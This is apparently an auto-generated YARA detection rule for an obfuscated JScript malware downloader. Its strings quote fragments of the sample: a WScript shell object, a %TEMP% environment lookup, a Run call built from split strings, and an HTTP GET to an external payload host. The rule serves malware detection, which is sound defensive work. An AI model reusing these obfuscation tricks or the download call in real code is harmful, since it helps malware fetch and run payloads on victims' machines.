rule sig_20160428_7a8e21fd6c68295f0405a20d6eb5a4cb {
  meta:
    description = "datamaliciousorder - file 20160428_7a8e21fd6c68295f0405a20d6eb5a4cb.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6e87425d469b5f52ab68355f7e46eaf5526386fe002412e7870dae9ebec59bf6"

  strings:
    $s1  = "function PmuRjvRcvProWnbRpxAyc(HkjRxqEfdEsiEceWxcJwl){CuwUtiDnnCyuDzyGqtEkx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s2  = "function HsrQreVeyPkpYaxPrnQps() {return CuwUtiDnnCyuDzyGqtEkx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s3  = "function PmuRjvRcvProWnbRpxAyc(HkjRxqEfdEsiEceWxcJwl){CuwUtiDnnCyuDzyGqtEkx[(\"Cunt\", \"anal\", \"R\")+ \"u\" + (\"fuck\", \"n" ascii
    $s4  = "return IkzGrnMboIzeKsrGeqGqe - WhrVirNtvWjrTbiJvxSrc;};" fullword ascii
    $s5  = "function KvxKqeWiyKffSigDepOme(IkzGrnMboIzeKsrGeqGqe, WhrVirNtvWjrTbiJvxSrc){XggKhrAjgYylXanSuqKtl = XggKhrAjgYylXanSuqKtl * 1; " ascii
    $s6  = "var CuwUtiDnnCyuDzyGqtEkx = function WdeIooDxtQewVlwWorYwj() {return YuvFewVfgEelAvhOkbJag[LxoHdiRpfApiVtiZulDto](\"WScript\"+\"" ascii
    $s7  = "ZhhZmjNnwOadYyuBdkKnc[DlpFigTzhNinJdxAerMzi](\"G\" + \"ET\", \"http://zahariev.myjino.ru/n8sja\", false);" fullword ascii
    $s8  = "var CuwUtiDnnCyuDzyGqtEkx = function WdeIooDxtQewVlwWorYwj() {return YuvFewVfgEelAvhOkbJag[LxoHdiRpfApiVtiZulDto](\"WScript\"+\"" ascii
    $s9  = "var YuvFewVfgEelAvhOkbJag = this[\"WScript\"];" fullword ascii
    $s10 = "function HsrQreVeyPkpYaxPrnQps() {return CuwUtiDnnCyuDzyGqtEkx[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"" ascii
    $s11 = "function VrvWojRyoSviIkoTteQhl(){return EqkZlwWbhVwxUacHqgRez + \"\";};" fullword ascii
    $s12 = "function KvxKqeWiyKffSigDepOme(IkzGrnMboIzeKsrGeqGqe, WhrVirNtvWjrTbiJvxSrc){XggKhrAjgYylXanSuqKtl = XggKhrAjgYylXanSuqKtl * 1; " ascii
    $s13 = "if (ZhhZmjNnwOadYyuBdkKnc[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s14 = "function TngOijXvgHpzXseRkgOlf() {return ((WapZahQirBbrDscDlgRws == true) && (WapZahQirBbrDscDlgRws == TqbIfyZmyXxpUqzTihYdu)) ?" ascii
    $s15 = "function TngOijXvgHpzXseRkgOlf() {return ((WapZahQirBbrDscDlgRws == true) && (WapZahQirBbrDscDlgRws == TqbIfyZmyXxpUqzTihYdu)) ?" ascii
    $s16 = "function QxmPuwDvkTzyXfxCwdZzw(RrgHjmEdoFnfPhmUmgAir) {var FngUoaVfkIynXesAagVie = (1, 2, 3, 4, 5, RrgHjmEdoFnfPhmUmgAir); retur" ascii
    $s17 = "WapZahQirBbrDscDlgRws = true; " fullword ascii
    $s18 = "TqbIfyZmyXxpUqzTihYdu = true; " fullword ascii
    $s19 = "function FvcZixAkxBfhDsjPmdAni(){return LxoHdiRpfApiVtiZulDto;};" fullword ascii
    $s20 = "return KvxKqeWiyKffSigDepOme(1 == 1 ? GesUkxNexRhyDjfWwsTzk : 0, 1 == 1 ? RdaQvdXxdGlbWukQypPcn : 0);" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}